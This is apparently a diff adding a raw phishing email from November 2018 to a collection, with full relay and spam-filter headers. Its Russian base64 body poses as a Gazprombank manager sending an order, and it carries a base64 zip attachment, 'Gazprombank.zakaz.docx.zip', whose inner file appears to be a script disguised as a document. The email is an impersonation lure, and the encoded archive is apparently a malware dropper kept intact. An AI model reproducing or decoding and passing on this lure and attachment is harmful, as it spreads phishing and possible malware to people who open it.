@@ -1,0 +1,95 @@
+X-ASG-Debug-ID: 1542002951-104fc07cce2cc540001-AtRPap
+Received: from smtprelay07.ispgateway.de (smtprelay07.ispgateway.de [134.119.228.100]) by esg.evalar.ru with ESMTP id WAALKtCrVpjq9TDW (version=TLSv1.2 cipher=ECDHE-RSA-AES256-GCM-SHA384 bits=256 verify=NO) for <santa@evalar.ru>; Mon, 12 Nov 2018 13:09:12 +0700 (KRAT)
+X-Barracuda-Envelope-From: cp.lange@cycomhome.de
+X-Barracuda-Effective-Source-IP: smtprelay07.ispgateway.de[134.119.228.100]
+X-Barracuda-Apparent-Source-IP: 134.119.228.100
+Received: from [115.84.91.136] (helo=COMPUTER)
+	by smtprelay07.ispgateway.de with esmtpsa (TLSv1.2:ECDHE-RSA-AES256-GCM-SHA384:256)
+	(Exim 4.90_1)
+	(envelope-from <cp.lange@cycomhome.de>)
+	id 1gM5PJ-00004r-Ml
+	for santa@evalar.ru; Mon, 12 Nov 2018 07:09:10 +0100
+From: =?UTF-8?B?0JHQtdC70L7Qsg==?=<cp.lange@cycomhome.de> 
+Reply-To: =?UTF-8?B?0JHQtdC70L7Qsg==?=<cp.lange@cycomhome.de> 
+To: santa@evalar.ru
+Subject: =?UTF-8?B?0LfQsNC60LDQtw==?=
+Content-Type: multipart/mixed; boundary="mzexGlqimRdc2Fvoe3Ga422VBA6t7bOt"
+X-ASG-Orig-Subj: =?UTF-8?B?0LfQsNC60LDQtw==?=
+Message-Id: <E1gM5PJ-00004r-Ml@smtprelay07.ispgateway.de>
+Date: Mon, 12 Nov 2018 07:09:10 +0100
+X-Df-Sender: Y3AubGFuZ2VAY3ljb21ob21lLmRl
+X-Barracuda-Connect: smtprelay07.ispgateway.de[134.119.228.100]
+X-Barracuda-Start-Time: 1542002951
+X-Barracuda-Encrypted: ECDHE-RSA-AES256-GCM-SHA384
+X-Barracuda-URL: https://192.168.110.239:8443/cgi-mod/mark.cgi
+X-Barracuda-Orig-Rcpt: santa@evalar.ru
+X-Barracuda-Scan-Msg-Size: 234
+X-Virus-Scanned: by bsmtpd at evalar.ru
+X-Barracuda-BRTS-Status: 1
+X-Barracuda-Spam-Score: 1.16
+X-Barracuda-Spam-Status: No, SCORE=1.16 using global scores of TAG_LEVEL=3.5 QUARANTINE_LEVEL=5.0 KILL_LEVEL=8.0 tests=BSF_SC0_SA590, HTML_MESSAGE, MIME_HEADER_CTYPE_ONLY, MIME_MISSING_BOUNDARY, NO_REAL_NAME
+X-Barracuda-Spam-Report: Code version 3.2, rules version 3.2.3.61643
+	Rule breakdown below
+	 pts rule name              description
+	---- ---------------------- --------------------------------------------------
+	0.00 NO_REAL_NAME           From: does not include a real name
+	0.00 HTML_MESSAGE           BODY: HTML included in message
+	0.10 MIME_MISSING_BOUNDARY  RAW: MIME section missing boundary
+	0.86 MIME_HEADER_CTYPE_ONLY 'Content-Type' found without required MIME
+	                           headers
+	0.20 BSF_SC0_SA590          Custom Rule SA590
+
+--mzexGlqimRdc2Fvoe3Ga422VBA6t7bOt
+Content-Type: text/html; charset=UTF-8
+Content-Transfer-Encoding: base64
+
+0JTQvtCx0YDRi9C5INC00LXQvdGMITxwPg0KPGJyPg0K0J7RgtC/0YDQsNC70Y/RjiDQt9Cw0L/R
+gNC+0YEg0L3QsCDRg9GB0LvRg9Cz0LguINCf0L7QtNGA0L7QsdC90L7RgdGC0Lgg0LLQviDQstC7
+0L7QttC10L3QuNC4PGJyPg0KPGJyPg0K0JHQtdC70L7QsiDQndC40LrQvtC70LDQuTxwPg0K0JzQ
+tdC90LXQtNC20LXRgCDQv9GA0L7QtdC60YLQsDxicj4NCtCQ0J4gItCT0LDQt9C/0YDQvtC80LHQ
+sNC90Loi
+--mzexGlqimRdc2Fvoe3Ga422VBA6t7bOt
+Content-Type: application/octet-stream; name="Gazprombank.zakaz.docx.zip"
+Content-Disposition:attachment; filename="Gazprombank.zakaz.docx.zip"
+Content-Transfer-Encoding: base64
+
+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
+AAA=
+--mzexGlqimRdc2Fvoe3Ga422VBA6t7bOt
+
